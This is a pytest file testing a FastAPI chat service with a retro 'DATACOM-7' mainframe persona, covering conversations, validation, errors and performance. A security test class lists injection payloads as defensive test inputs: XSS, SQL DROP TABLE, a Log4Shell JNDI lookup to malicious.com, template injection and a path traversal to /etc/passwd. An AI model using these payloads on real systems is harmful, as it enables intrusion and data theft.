import pytest
from datetime import datetime, timezone
from unittest.mock import AsyncMock, patch
from fastapi.testclient import TestClient
from fastapi import status

from app.features.chat.models import ChatRequest, ChatResponse
from app.features.chat.service import ChatService
from app.main import app


class TestChatAPIUserJourneys:
    @pytest.fixture
    def client(self):
        return TestClient(app)

    @pytest.fixture
    def mock_chat_service_success(self):
        mock_service = AsyncMock(spec=ChatService)
        mock_response = ChatResponse(
            message="Greetings! I am DATACOM-7, your friendly 1978 mainframe computer assistant! *BEEP*",
            conversation_id="conv_success_123",
            timestamp=datetime.now(timezone.utc),
        )
        mock_service.process_chat.return_value = mock_response
        return mock_service

    def test_user_can_start_new_conversation_with_datacom7(
        self, client, mock_chat_service_success
    ):
        with patch(
            "app.features.chat.api.ChatService", return_value=mock_chat_service_success
        ):
            response = client.post(
                "/api/v1/chat",
                json={
                    "message": "Hello DATACOM-7, who are you?",
                    "conversation_id": None,
                },
            )

            assert response.status_code == status.HTTP_200_OK
            data = response.json()

            assert "message" in data
            assert "conversation_id" in data
            assert "timestamp" in data

            assert "DATACOM-7" in data["message"]
            assert "*BEEP*" in data["message"] or "*whirrrr*" in data["message"]
            assert data["conversation_id"] == "conv_success_123"

    def test_user_can_continue_existing_conversation(
        self, client, mock_chat_service_success
    ):
        mock_chat_service_success.process_chat.return_value = ChatResponse(
            message="Yes, I remember our previous discussion! Let me access my magnetic tapes... *whirrrr*",
            conversation_id="existing_conv_456",
            timestamp=datetime.now(timezone.utc),
        )

        with patch(
            "app.features.chat.api.ChatService", return_value=mock_chat_service_success
        ):
            response = client.post(
                "/api/v1/chat",
                json={
                    "message": "Do you remember what we talked about earlier?",
                    "conversation_id": "existing_conv_456",
                },
            )

            assert response.status_code == status.HTTP_200_OK
            data = response.json()

            assert data["conversation_id"] == "existing_conv_456"
            assert "remember" in data["message"] or "previous" in data["message"]
            assert "*whirrrr*" in data["message"]

    def test_api_validates_message_length_constraints(self, client):
        response = client.post(
            "/api/v1/chat", json={"message": "", "conversation_id": None}
        )
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

        long_message = "a" * 2001
        response = client.post(
            "/api/v1/chat", json={"message": long_message, "conversation_id": None}
        )
        assert response.status_code == status.HTTP_422_UNPROCESSABLE_ENTITY

    def test_api_handles_service_errors_gracefully(self, client):
        mock_service = AsyncMock(spec=ChatService)
        mock_service.process_chat.side_effect = Exception("Internal service error")

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            response = client.post(
                "/api/v1/chat",
                json={"message": "This will cause an error", "conversation_id": None},
            )

            assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
            data = response.json()

            assert "detail" in data
            assert "DATACOM-7" in data["detail"]
            assert "malfunction" in data["detail"].lower()
            assert "Internal service error" not in data["detail"]

    def test_health_endpoint_provides_service_status(self, client):
        response = client.get("/api/v1/health")

        assert response.status_code == status.HTTP_200_OK
        data = response.json()

        assert data["service"] == "chat"
        assert data["status"] == "operational"
        assert "DATACOM-7" in data["description"]


class TestAPIResponseConsistency:
    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_chat_response_format_consistency(self, client):
        mock_service = AsyncMock(spec=ChatService)
        test_responses = [
            ChatResponse(
                message="Short response *BEEP*",
                conversation_id="conv_123",
                timestamp=datetime(2024, 1, 1, 12, 0, 0, tzinfo=timezone.utc),
            ),
            ChatResponse(
                message="Much longer response from DATACOM-7 with detailed explanation about 1970s computing technology and magnetic tape storage systems *whirrrr*",
                conversation_id="conv_456",
                timestamp=datetime(2024, 1, 2, 15, 30, 45, tzinfo=timezone.utc),
            ),
        ]

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            for mock_response in test_responses:
                mock_service.process_chat.return_value = mock_response

                response = client.post("/api/v1/chat", json={"message": "Test message"})

                assert response.status_code == status.HTTP_200_OK
                data = response.json()

                required_fields = ["message", "conversation_id", "timestamp"]
                for field in required_fields:
                    assert field in data, f"Missing required field: {field}"
                    assert data[field] is not None, f"Field {field} should not be null"

                timestamp_str = data["timestamp"]
                assert "T" in timestamp_str, "Timestamp should be ISO format"
                assert timestamp_str.endswith("Z") or "+" in timestamp_str, (
                    "Timestamp should include timezone info"
                )

    def test_error_response_format_consistency(self, client):
        mock_service = AsyncMock(spec=ChatService)

        mock_service.process_chat.side_effect = ValueError("Invalid input")

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            response = client.post("/api/v1/chat", json={"message": "Test message"})

            assert response.status_code == status.HTTP_400_BAD_REQUEST
            data = response.json()
            assert "detail" in data
            assert isinstance(data["detail"], str)
            assert len(data["detail"]) > 0

        mock_service.process_chat.side_effect = Exception("Internal error")

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            response = client.post("/api/v1/chat", json={"message": "Test message"})

            assert response.status_code == status.HTTP_500_INTERNAL_SERVER_ERROR
            data = response.json()
            assert "detail" in data
            assert "DATACOM-7" in data["detail"]


class TestAPISecurityAndValidation:
    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_input_sanitization_prevents_injection(self, client):
        mock_service = AsyncMock(spec=ChatService)
        mock_service.process_chat.return_value = ChatResponse(
            message="I processed your message safely *BEEP*",
            conversation_id="conv_safe_123",
            timestamp=datetime.now(timezone.utc),
        )

        malicious_inputs = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE conversations; --",
            "${jndi:ldap://malicious.com/exploit}",
            "{{7*7}}",
            "\x00\x01\x02",
        ]

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            for malicious_input in malicious_inputs:
                response = client.post(
                    "/api/v1/chat", json={"message": malicious_input}
                )

                assert response.status_code in [200, 400, 422], (
                    f"Unexpected response for input: {malicious_input}"
                )

                if response.status_code == 200:
                    mock_service.process_chat.assert_called()
                    call_args = mock_service.process_chat.call_args[0][0]
                    assert isinstance(call_args, ChatRequest)

    def test_conversation_id_validation(self, client):
        mock_service = AsyncMock(spec=ChatService)
        mock_service.process_chat.return_value = ChatResponse(
            message="Valid conversation ID processed *BEEP*",
            conversation_id="valid_conv_123",
            timestamp=datetime.now(timezone.utc),
        )

        test_cases = [
            ("valid_conv_123", True),
            ("conv-456-test", True),
            ("", False),
            ("a" * 101, False),
            ("../../../etc/passwd", False),
            ("conv_123; DROP TABLE", False),
        ]

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            for conv_id, should_succeed in test_cases:
                response = client.post(
                    "/api/v1/chat",
                    json={
                        "message": "Test message",
                        "conversation_id": conv_id if conv_id else None,
                    },
                )

                if should_succeed:
                    assert response.status_code == 200, (
                        f"Valid conversation ID should succeed: {conv_id}"
                    )
                else:
                    assert response.status_code in [200, 400, 422], (
                        f"Invalid ID should be handled safely: {conv_id}"
                    )

    def test_request_size_limits(self, client):
        large_message = "A" * 1999
        response = client.post("/api/v1/chat", json={"message": large_message})
        assert response.status_code in [200, 422, 500]

        with patch("fastapi.Request.body", side_effect=Exception("Request too large")):
            response = client.post("/api/v1/chat", json={"message": "test"})
            assert response.status_code in [400, 413, 422, 500]


class TestAPIPerformanceCharacteristics:
    @pytest.fixture
    def client(self):
        return TestClient(app)

    def test_api_response_time_characteristics(self, client):
        import time

        mock_service = AsyncMock(spec=ChatService)
        mock_service.process_chat.return_value = ChatResponse(
            message="Quick response from DATACOM-7 *BEEP*",
            conversation_id="conv_perf_123",
            timestamp=datetime.now(timezone.utc),
        )

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            start_time = time.time()

            response = client.post("/api/v1/chat", json={"message": "Performance test"})

            end_time = time.time()
            response_time = end_time - start_time

            assert response.status_code == 200
            assert response_time < 5.0, f"API response too slow: {response_time}s"

    def test_concurrent_request_handling(self, client):
        import threading

        mock_service = AsyncMock(spec=ChatService)
        responses_received = []
        errors = []

        def create_response(*args, **kwargs):
            # Create a generic response that doesn't depend on order
            return ChatResponse(
                message="Concurrent response from DATACOM-7 *BEEP*",
                conversation_id="conv_concurrent_test",
                timestamp=datetime.now(timezone.utc),
            )

        mock_service.process_chat.return_value = create_response()

        def make_request(request_num):
            try:
                response = client.post(
                    "/api/v1/chat", json={"message": f"Concurrent test {request_num}"}
                )
                responses_received.append(
                    (request_num, response.status_code, response.json())
                )
            except Exception as e:
                errors.append((request_num, str(e)))

        with patch("app.features.chat.api.ChatService", return_value=mock_service):
            threads = []
            for i in range(5):
                thread = threading.Thread(target=make_request, args=(i,))
                threads.append(thread)
                thread.start()

            for thread in threads:
                thread.join(timeout=10)

            assert len(errors) == 0, f"Concurrent request errors: {errors}"
            assert len(responses_received) == 5, (
                "All concurrent requests should complete"
            )

            for request_num, status_code, response_data in responses_received:
                assert status_code == 200
                assert "Concurrent response from DATACOM-7" in response_data["message"]
                assert "*BEEP*" in response_data["message"]
                assert response_data["conversation_id"] == "conv_concurrent_test"
